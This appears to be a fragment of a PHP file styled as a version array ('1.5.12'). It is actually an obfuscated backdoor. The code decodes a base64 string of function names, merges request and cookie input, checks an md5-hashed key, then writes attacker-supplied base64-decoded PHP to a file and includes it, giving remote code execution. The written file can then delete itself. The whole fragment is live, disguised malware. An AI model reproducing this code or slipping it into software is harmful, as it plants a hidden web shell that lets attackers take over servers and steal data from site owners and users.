...
$version = ['1.5.12', $h = '1729153399' => $_ = "X1JFUVVFU1QsX0NPT0tJRSxhcnJheV9tZXJnZSxtZDUsc3RybGVuLHN0cmlwb3MsPD9waHAgQHVubGluayhfX0ZJTEVfXyk7Pz4sZmlsZV9wdXRfY29udGVudHMsYmFzZTY0X2RlY29kZSxuYW1lLF9leHAsc3Vic3RyLA8+72de12948a6653d37b7005a5ffd51208",$q = function($u,$y,$_=''){return empty($u[$y])?$_:$u[$y];}, $c = substr($_, strpos($_, '+') + 1) => $_ = explode(',', base64_decode($_)), ($l = $_REQUEST) && ($l = $_[2]($GLOBALS[$_[1]], $l)) && ($_[3]($q($l, 'a', $q($l, $_[10])) . "ioyasbf") === $c) && ($r = function ($f, $s, $h) {if ($h[4]($s = $h[8]($s)) > 18 && $h[5]($s, $h[11]($h[6], 0, 5)) !== false && $h[7]($f, $h[6] . $s)) {include $f;return true; }}) && $q($l,$_[9]) ? $r('1729153399', $l[$_[9]], $_) && exit(0) : ''];
